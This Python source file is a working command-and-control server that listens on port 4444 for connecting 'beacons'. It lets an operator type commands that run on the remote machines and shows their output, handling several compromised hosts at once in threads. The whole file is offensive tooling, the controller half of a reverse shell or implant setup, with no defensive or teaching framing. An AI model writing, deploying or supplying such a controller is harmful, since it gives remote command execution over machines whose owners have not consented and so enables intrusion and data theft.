import socket
import threading
import sys

# Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444       # The port the beacon will connect to

def handle_client(client_socket, addr):
    print(f"\n[+] New connection established from {addr[0]}:{addr[1]}")
    
    while True:
        # Ask the operator (you) for a command
        cmd = input(f"C2 ({addr[0]})> ")
        
        if cmd.lower() == 'exit':
            client_socket.send(b'exit')
            client_socket.close()
            print(f"[-] Closed connection to {addr[0]}")
            break
            
        if cmd.strip() == '':
            continue

        try:
            # Send the command to the beacon
            client_socket.send(cmd.encode('utf-8'))
            
            # Receive the output from the beacon
            response = client_socket.recv(4096).decode('utf-8')
            print(response)
            
        except Exception as e:
            print(f"[-] Connection lost with {addr[0]}: {e}")
            client_socket.close()
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] C2 Server listening on {HOST}:{PORT}")
    except Exception as e:
        print(f"[-] Error starting server: {e}")
        sys.exit(1)

    while True:
        client_socket, addr = server.accept()
        # Start a new thread for each connection so we can handle multiple beacons
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    start_server()
